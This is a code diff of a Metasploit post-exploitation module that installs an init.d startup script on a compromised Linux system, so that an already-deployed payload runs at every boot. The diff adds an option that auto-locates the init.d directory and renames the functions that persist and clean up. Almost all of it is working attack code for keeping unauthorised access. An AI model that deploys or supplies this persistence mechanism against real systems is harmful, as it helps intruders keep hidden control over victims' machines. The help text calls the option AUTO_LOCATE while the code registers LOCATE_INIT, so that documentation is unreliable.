@@ -13,9 +13,10 @@
 #
 #
 # [ DESCRIPTION ]
-# Builds 'persistance' init.d startup script that allow users to persiste
-# your elf binary (linux executable) on Linux Kali distros at every startup.
-# HINT: This post-exploitation module requires the payload allready deployed.
+# Builds 'persistance' init.d startup script that allow users to
+# persiste your binary (executable) on Linux distros at every startup.
+# HINT: This post-module accepts any 'linux' chmoded payloads (sh|py|rb|etc..)
+# HINT: This post-module requires the payload allready deployed on target system.
 # HINT: In Kali distos we are 'root' by default, so this post module does
 # not required privilege escalation in systems were we are allready root ..
 #
@@ -25,6 +26,8 @@
 # The full remote path of binary to execute (remote) => set REMOTE_PATH /root/payload
 # The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
 # Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
+# Auto-Locate init.d directory full path?   (remote) => set AUTO_LOCATE true
+# HINT: 'AUTO_LOCATE true' will overwrite 'INIT_PATH' variable declarations
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -83,7 +86,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'Linux Kali init.d persistence post-module',
                         'Description'   => %q{
-                                        Builds 'persistance' init.d startup script that allow users to persiste your elf binary (linux executables) on Linux Kali distros at every startup. This post-exploitation module requires the payload allready deployed in target system and root privileges active (if non-Kali distros).
+                                        Builds 'persistance' init.d startup script that allow users to persiste your binary (executable) on Linux distros at every startup. This post-module requires the payload allready deployed on target system and accepts any 'linux' chmoded payloads (sh|py|rb|etc) to be auto-executed at startup.
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -91,8 +94,8 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.2',
-                        'DisclosureDate' => 'mai 31 2017',
+                        'Version'        => '$Revision: 1.3',
+                        'DisclosureDate' => 'jun 1 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',   # thats no need for privilege escalation (in-kali) ..
@@ -103,6 +106,7 @@ class MetasploitModule < Msf::Post
                         'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                         'References'     =>
                                 [
+                                         [ 'URL', 'http://goo.gl/ny69NS' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                          [ 'URL', 'https://unix.stackexchange.com/questions/326921/run-two-scripts-with-init-d' ]
@@ -126,6 +130,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
+                                OptBool.new('LOCATE_INIT', [ false, 'Auto-Locate init.d directory full path?' , false]),
                                 OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)']),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false])
                         ], self.class) 
@@ -137,13 +142,24 @@ class MetasploitModule < Msf::Post
 #
 # Build remote init.d persistence script ..
 #
-def ls_stage1
+def ls_persisting
 
   session = client
   rem = session.sys.config.sysinfo
-  init = datastore['INIT_PATH']          # /etc/init.d
-  script_check = "#{init}/persistance"   # /etc/init.d/persistance
-  remote_path = datastore['REMOTE_PATH'] # /root/payload
+  remote_path = datastore['REMOTE_PATH']     # /root/payload
+  init = datastore['INIT_PATH']              # /etc/init.d
+  find = datastore['LOCATE_INIT']            # false
+  #
+  # Auto-Locate init.d directory? (true|false)
+  #
+  if find == 'true'
+    auto = cmd_exe("locate init.d | grep -m 1 '.d'")
+    vprint_warning("Auto-Locate: #{auto}")
+    initd_path = "#{auto}"
+  else
+    initd_path = "#{init}"
+  end
+  script_check = "#{initd_path}/persistance" # /etc/init.d/persistance
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -179,9 +195,10 @@ def ls_stage1
     #
     # Check init.d directory existance (remote)..
     #
-    if not session.fs.directory.exist?(init)
-      vprint_error("%red" + "path: #{init} not found ..")
+    if not session.fs.directory.exist?(initd_path)
+      vprint_error("%red" + "path: #{initd_path} not found ..")
       vprint_error("Please set a diferent path in 'INIT_PATH' option ..")
+      vprint_error("OR activate 'AUTO_LOCATE true' to auto-locate directory ..")
       return nil
     end
     vprint_status("Remote service directory found ..")
@@ -191,7 +208,7 @@ def ls_stage1
       #
       vprint_warning("Writing init.d persistence startup script ..")
       Rex::sleep(1.0)
-      File.open("#{init}/persistance", "w+") do |f|
+      File.open("#{script_check}", "w+") do |f|
         f.write("#!/bin/sh")
         f.write("### BEGIN INIT INFO")
         f.write("# Provides:          persistence on kali")
@@ -208,7 +225,7 @@ def ls_stage1
         f.write("./#{remote_path}")
         f.close
       end
-      vprint_good("Service path: #{init}/persistance")
+      vprint_good("Service path: #{script_check}")
       Rex::sleep(1.0)
 
       #
@@ -248,12 +265,23 @@ end
 #
 # Delete init.d script and confs ..
 #
-def ls_stage2
+def ls_cleanning
 
   session = client
   rem = session.sys.config.sysinfo
   init = datastore['INIT_PATH']        # /etc/init.d
-  script_check = "#{init}/persistance" # /etc/init.d/persistance
+  find = datastore['LOCATE_INIT']      # false
+  #
+  # Auto-Locate init.d directory? (true|false)
+  #
+  if find == 'true'
+    auto = cmd_exe("locate init.d | grep -m 1 '.d'")
+    vprint_warning("Auto-Locate: #{auto}")
+    initd_path = "#{auto}"
+  else
+    initd_path = "#{init}"
+  end
+  script_check = "#{initd_path}/persistance" # /etc/init.d/persistance
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -376,11 +404,11 @@ def run
 # Selected settings to run
 #
       if datastore['REMOTE_PATH']
-         ls_stage1
+         ls_persisting
       end
 
       if datastore['DEL_PERSISTENCE']
-         ls_stage2
+         ls_cleanning
       end
    end
 end
